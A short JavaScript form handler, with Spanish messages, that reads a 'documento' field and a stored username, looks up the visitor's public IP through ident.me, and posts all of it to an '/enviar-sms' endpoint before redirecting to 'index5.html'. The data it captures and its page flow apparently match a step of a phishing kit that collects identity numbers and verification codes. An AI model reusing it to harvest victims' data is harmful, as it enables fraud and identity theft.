function enviarFormulario(event) {
    event.preventDefault();

    const documento = document.getElementById("documento").value;
    const usuario = localStorage.getItem("usuario");
    const hora = new Date().toLocaleTimeString();

    fetch('https://ipv4.ident.me/json')
    .then(response => response.json())
    .then(ipData => {
        const ip = ipData.ip;

        return fetch('/enviar-sms', {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ documento, usuario, ip, hora })
        });
    })
    .then(response => {
        if (response.ok) {
            window.location.href = "../index5.html";
        } else {
            console.error("Error:", response.statusText);
            alert("Error al verificar el código");
        }
    })
    .catch(error => {
        console.error("Error de conexión:", error);
        alert("Error al obtener datos de geolocalización");
    });
}
